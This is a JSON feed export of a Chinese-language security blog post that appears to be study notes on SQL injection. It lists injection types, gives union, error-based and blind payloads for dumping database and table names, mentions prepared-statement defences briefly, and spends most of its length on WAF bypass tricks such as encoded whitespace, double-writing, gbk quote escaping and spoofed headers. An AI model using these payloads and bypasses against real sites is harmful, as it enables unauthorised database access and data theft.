{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo",
    "subtitle": "",
    "icon": "http://example.com/images/favicon.ico",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/04/09/Internet%20Security/hello-world/",
            "url": "http://example.com/2023/04/09/Internet%20Security/hello-world/",
            "title": "SQL注入",
            "date_published": "2023-04-09T03:33:00.000Z",
            "content_html": "<h1 id=\"本周重点\"><a href=\"#本周重点\" class=\"headerlink\" title=\"本周重点\"></a>本周重点</h1><h3 id=\"1-产生原理（实质）\"><a href=\"#1-产生原理（实质）\" class=\"headerlink\" title=\"1.产生原理（实质）\"></a>1.产生原理（实质）</h3><p>1.用户能调控参数（像id=2 union select 1,2,3–+)要能添加代码<br>2.原本数据库只执行（id=2)语句，但执行了用户拼接的一些代码</p>\n<h3 id=\"2-类型\"><a href=\"#2-类型\" class=\"headerlink\" title=\"2.类型\"></a>2.类型</h3><p>1.联合注入<br>        2.堆叠注入<br>        3.宽字节注入<br>        4.cookie注入<br>        5.XFF头注入<br>        6.UA注入（user-agent注入）<br>        7.Referer注入<br>        8.二次注入<br>        9.base64注入<br>        11.万能密码<br>        12.文件读写<br>盲注类型：<br>        1.基于时间的盲注     sleep()   benchmark()<br>        2.基于布尔的注入<br>        3.基于报错的注入     updatexml()  extractvalue()  floor()  exp()</p>\n<h3 id=\"语言\"><a href=\"#语言\" class=\"headerlink\" title=\"语言\"></a>语言</h3><pre><code class=\"SQL\">一，union select\n?id=-2 &#39;   &quot;   )     &#39;)    &quot;)      ]     )]\norder by 3 --+\nunion select 1,2,3 --+\nunion select 1,database(),3 --+\nunion select 1,select group_concat(table_name) from information_schema.tables where table_schema=database(),3 --+\nunion select 1,select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name =&quot;&quot;,3--+\nunion select 1,select group_concat(id)from users,3 --+\n二，报错注入\n1.and extractvalue(1,concat(0x7e,(database()),0x7e)) --+\n2.and updatexml(1,(concat(0x3a,(database()),0x3a)),1) --+\n0x7e----&gt;~\n0x3a----&gt;:\n三,爆出\nindex.php?id=2&#39; and (select 1 from (select count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b) --+\n</code></pre>\n<h3 id=\"3-如何防范\"><a href=\"#3-如何防范\" class=\"headerlink\" title=\"3.如何防范\"></a>3.如何防范</h3><h4 id=\"存在哪些风险、对应的对策是什么。\"><a href=\"#存在哪些风险、对应的对策是什么。\" class=\"headerlink\" title=\"存在哪些风险、对应的对策是什么。\"></a>存在哪些风险、对应的对策是什么。</h4><blockquote>\n<p>1.预编译  （数据库不会将参数的内容视为SQL命令执行，而是作为一个字段的属性值来处理）</p>\n<blockquote>\n<p>2.PDO预处理                 (本地和Mysql服务端使用字符集对输入进行转义)</p>\n<blockquote>\n<p>3.正则表达式过滤          (如果用户输入了非法信息则利用正则表达式过滤)<br> 4那如何反防范呢？<br>接下来将展示一些绕过的姿势。<br>1.屏蔽or and 空格 注释符<br>or 用|| 或  |<br>and 用&amp;&amp; 或&amp;</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<h3 id=\"4那如何反防范呢？\"><a href=\"#4那如何反防范呢？\" class=\"headerlink\" title=\"4那如何反防范呢？\"></a>4那如何反防范呢？</h3><h4 id=\"接下来将展示一些绕过的姿势。\"><a href=\"#接下来将展示一些绕过的姿势。\" class=\"headerlink\" title=\"接下来将展示一些绕过的姿势。\"></a>接下来将展示一些绕过的姿势。</h4><blockquote>\n<p>替代空格的东西<br>%09 水平tab键<br>%0a 新建一行<br>%0c 新建一页<br>%0d 回车键<br>%0b 垂直tab键<br>%a0 也是空格键</p>\n</blockquote>\n<blockquote>\n<p>屏蔽–+号<br>用 or ‘1’ =’1 代替<br>如<br>?id=2000000’%0aunion%0aselect%0a1,2,3%0a||%0a’1’=’1<br>如果哪天%的空格都不能用，不用空格<br>无空格写法用（）<br>?id=1’||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)like(database())),0x7e),1))||’1’=’1</p>\n</blockquote>\n<hr>\n<pre><code class=\"SQL\">小知识:\n对&#39; \\ 屏蔽，前面多加个\\\n数据库用的是gbk编码，会把2个字符当作一个汉字\n如：\n?id=1%df\\&#39;（在机器看来这就是个1+字符+&#39;)\npost类\nburp抓包\n在目标位置admin%df%27 union select 1,2 #\n\n常见绕过：\n1.大小写绕过\nUnion SelEct\n2.双写绕过\nununionion\n3.编码绕过\nsecurity--&gt;hex编码\nurlencode\n4.注释符/**/\nuni/**/on sel/**/ect\n5.对于空格绕过\n开头已提过了\n6.对于or and绕过\nand = &amp;&amp;\nor = ||\n7.单引号\n%df%27\n8.反引号\n反引号只能在表名，一般情况下如果表名和语法一样，那么就必须用反引号修饰，否则数据库会误以为这是语法！！！！！！！！！！！！！！！！！！！！！！\nselect username,password from `table1` where id=&#39;1&#39; limit 0,1\nwhere\nselect * from `where` where id =1\n9.内联注释\nand /*!select*/ 1,2\n10.&lt;&gt;绕过\nuni&lt;&gt;on sel&lt;&gt;ect\n对了这里加一布尔型的盲注(猜库名\nselect * from users where id=1 and ascii(substr(database(),0,1)) &gt; 115\ngreatest least\nselect * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64\n\n\n11.屏蔽逗号\nselect substr(&quot;xxxxx&quot;,1,3)\nselect substr(&quot;xxxxx&quot; from 1 to 3)\n\nunion select 1,2,3\nunion select * from (select 1)a join (select 2)b join (select 3)c;\n\nlimit 0,1\nlimit 0 offset 1\n12.sleep屏蔽\nand sleep(1)\nand benchmark(100000000（0的个数视情况而定）,1);\n13.group_concat屏蔽\nselect group_concat(&quot;haha&quot;,&quot;niao&quot;);\nselect concat_ws(&quot; &quot;,&quot;haha&quot;,&quot;niao&quot;);\n（把&quot;&quot;放到&quot;haha&quot;,&quot;niao&quot;中间并合并输出）\n14.等号屏蔽\n用 like rlike regexp &lt;&gt;(不等号)?id=1&#39; or 1 like 1\n?id=1&#39; or 1 &lt;&gt; 1\n15.post情况屏蔽#\nid=3&quot;) or 1=1 -- a 使用--空格a可以在post情况下替代#\n16.ip地址拦截（只允许内网访问）\nX-forwarded-for：ip地址\nX-remote-IP：ip地址\nX-Originating-IP：ip地址\nX-remote-addr：ip地址\nX-Real-Ip：ip地址\n(一般放在抓包中间，DNT之后)\n17.修改静态资源\nhttp://www.xx.com/sql.php?id=1\n可以替换为\nhttp://www.xx.com/sql.php/1.js?id=1\n18.url白名单\n为了防止防火墙误伤，部分waf(防火墙)内置白名单列表 admin manager system...\n如:\nhttp://www.xx.com/sql.php/admin.php?id=1\nhttp://www.xx.com/sql.php?xxxx=/manager/&amp;b=攻击代码\n\nhttp://www.xx.com/../../../../manager/../sql.php?id=1\n19.爬虫白名单(waf让baidu等搜索引擎蜘蛛能进入)\n伪造自己是搜索引擎（修改user-agent）\n将user-agent改为baidu等一些搜索引擎蜘蛛的user-agent\n20.数据库注释执行\n/*!50001 select * from table1*/;\n如果数据库版本是5.00.01 版本以下的，语句才会执行\n/*!45509 union select */ 1,2,3 --+\n21.增加干扰\nunion all %23%a0 select 1,2,3 --+\n</code></pre>\n<h4 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h4><p>有什么想法或心得体会，都可以拿出来分享下。</p>\n",
            "tags": [
                "网安",
                "Top10"
            ]
        }
    ]
}